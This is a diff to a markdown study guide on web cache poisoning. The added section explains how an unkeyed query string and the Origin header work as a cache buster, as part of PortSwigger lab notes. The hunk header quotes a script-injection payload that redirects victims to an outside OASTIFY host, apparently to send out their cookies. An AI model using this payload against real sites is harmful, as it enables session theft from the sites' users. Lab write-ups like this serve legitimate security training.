@@ -1111,6 +1111,19 @@ GET /?utm_content='/><script>document.location="https://OASTIFY.COM?c="+document
 
 [PortSwigger Lab: Web cache poisoning via an unkeyed query parameter](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-param)  
 
+### Query String
+
+>In this situation, we can not add a cache buster as a query parameter like always `GET /?cb=123` because now, we still get a cache hit even if we change the query parameters. This indicates that they are not included in the cache key. If they were part of the cache key, requests `GET /?cb=1` and `GET /?cb=2` would represent two different cache keys and would get a miss.
+>Example:
+
+![cb1](images/cb1_hit.png)
+![cb1](images/cb2.png)
+
+>In this type of situations, headers like `Origin` can act as cache busters. They are part of the cache key, so every change on them would generate a miss on the cache key.
+>So, if the query parameter is not part of the cache key and is reflected on the response, it means that we can use it in combination with the cache buster and then, delete it. Just like this:
+
+![cb1](images/cb_origin.png)
+
 ### Cloaking utm_content  
 
 >Param Miner extension doing a `Bulk scan > Rails parameter cloaking scan` will ***identify*** the vulnerability automatically. Manually it can be identified by adding `;` to append another parameter to `utm_content`, the cache treats this as a single parameter. This means that the extra parameter is also excluded from the cache key.  
